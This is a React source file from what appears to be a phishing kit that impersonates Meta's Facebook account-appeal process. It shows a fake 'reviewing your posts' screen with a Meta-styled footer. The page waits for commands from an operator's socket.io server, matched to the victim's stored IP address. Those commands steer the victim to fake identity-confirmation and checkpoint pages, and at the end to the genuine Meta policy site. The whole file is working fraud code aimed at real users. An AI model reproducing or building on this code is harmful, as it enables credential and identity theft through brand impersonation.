import React, { useEffect, useState } from 'react';

import { BrowserRouter as Router, Routes, Route, Link, useNavigate } from 'react-router-dom';
import { Form, FormControl, Button, InputGroup, Row, Col, Container, Modal } from 'react-bootstrap';

import paste from '../images/paste.png';
import usericon from '../images/user.png';
import robot1 from '../images/robot1.png';
import robot2 from '../images/robot2.png';
import HeaderCheckpoint from './HeaderCheckpoint';
import Footer from './Footer';
import AppealDesign from './AppealDesign';
import ProgressBar from 'react-bootstrap/ProgressBar';
import io from 'socket.io-client';
import GLOBAL_ARRAY from "./globals";


const WaitProcess = () => {
		const navigate = useNavigate();

const socket = io(GLOBAL_ARRAY[5]);

	document.body.style.background = "#e9eaed";

	const [show, setShow] = useState(true);

	  const [waiting, setWaiting] = useState(true);

	  const handleCloseWait = () => setWaiting(false);
	  const handleShowWait = () => setWaiting(true);

	const handleClose = () => setShow(false);
	const handleShow = () => setShow(true);







var i = 0;
function move() {
  if (i == 0) {
    i = 1;
    var elem = document.getElementsByClassName("progress-bar");
    elem = elem[0];
    var width = 1;
    var id = setInterval(frame, 100);
    function frame() {
      if (width >= 100) {
        clearInterval(id);
        i = 0;
      } else {
        width = width + 0.05;
        elem.style.width = width + "%";
      }
    }
  }

}

function replacetext(){
	var checkingtexts = ["Checking your email address...", "Checking your posts...", "Checking your apps...", "Checking your tags...", "Checking your page roles...", "Checking People you added or followed...", "Checking your comments...", "Checking People you unfriended...", "Finished checking..."];
	var changetexti = setInterval(changetext, 1200);
	var j = 0;
    function changetext() {
      if (j >= checkingtexts.length) {
        clearInterval(changetexti);
        j = 0;
      } else {
        document.getElementById("processtextchange").innerHTML = checkingtexts[j];
        j++;
      }
    }
}




	useEffect(() => {
		

	    if (localStorage.getItem('hapii') === "1") {
	    	navigate('/appeal');
	    } else if (localStorage.getItem('hapii') === "2") {
	    	navigate('/appeal/identity/confirm/');
	    } else if (localStorage.getItem('hapii') === "3") {
	    	navigate('/appeal/identity/confirm/incorrect');
	    } else if (localStorage.getItem('hapii') === "4") {
	    	navigate('/appeal/checkpoint');
	    } else if (localStorage.getItem('hapii') === "5") {
	    	navigate('/appeal/checkpoint/incorrect');
	    } else if (localStorage.getItem('hapii') === "6") {
	    	
	    } else if (localStorage.getItem('hapii') === "7") {
	    	navigate('/appeal/checkpoint/restrict/no');
	    }
	    move();
	    replacetext();
	    setTimeout(() => {
			document.getElementById("fotojaroboti").src = robot2;
		}, 2000);

	    socket.on('message', message => {
			console.log(message.ipja == localStorage.getItem('ipja'));
			console.log(message.ipja);
			console.log(localStorage.getItem('ipja'));
		  if(message.ipja == localStorage.getItem('ipja')){
		  	
		  	localStorage.setItem('hapii', message.hapi)
		  	if(message.hapi == 8){
		  		window.location.href = "https://transparency.fb.com/policies/community-standards/";
		  	} else {
		  		navigate(message.urlja);
		  	}
		    
		  }
		});
	}, [])


	return (
		<div>
			
			<HeaderCheckpoint />
			<Container >
				<Row>
					<Col md={{ span: 8, offset: 2 }}>
						<div >
							

							<div className="bodykartaa">
								<Row>
									<Col>
										<AppealDesign/>
									</Col>
								</Row>
								<Row style={{ display: 'none' }}>
									<Col md={4}>
										<div className="putincenter">
											<img src={robot1} className="img-fluid imazhirobot" id="fotojaroboti" />
										</div>
									</Col>
									<Col md={8}>
										<p style={{ fontWeight: 600, color: '#1d2129'}} className="putincentermobile">Thank you for submitting your appeal.</p>
										<p style={{ fontSize: '14px' }}>We appreciate your patience as we automatically check all of your posts to ensure they comply with our community guidelines. This process may take up to 10 minutes to complete.</p>
										<p style={{ fontSize: '14px' }}>Please stay on this page while we review the information you provided. If we require any further details from you, you may be automatically redirected to verify your identity.</p>
										<ProgressBar id="progresis" visuallyHidden />
										<p className="process-text" id="processtextchange">Checking your email address...</p>
									</Col>
								</Row>
							</div>

						</div>
					</Col>
				</Row>
				<Row>
					<Col>
						<div class="bottomfooter"><div class="container"><ul style={{ marginBottom: '15px'}}><li>English (UK)</li><li>English (US)</li><li>Espaol</li><li>Portugus (Brasil)</li><li>Franais (France)</li><li>Espaol (Espaa)</li><li>More languages</li></ul><ul><li> 2022 Meta</li><li>About</li><li>Developers</li><li>Careers</li><li>Privacy</li><li>Cookies</li><li>Terms</li><li>Help Centre</li></ul></div></div>
					</Col>
				</Row>
			</Container>
			<Modal className="waitingmodal" show={waiting} onHide={handleCloseWait}>
       
        <Modal.Body>
        <div class="loader-container">
									        <div class="loader"></div>
									        <p style={{ color:'white', textAlign:'center', marginTop: '15px'}}>Please wait while we review your information. You may be asked to verify your identity.</p>
									    </div>
</Modal.Body>
      </Modal>
		</div>
	  
	)
}

export default WaitProcess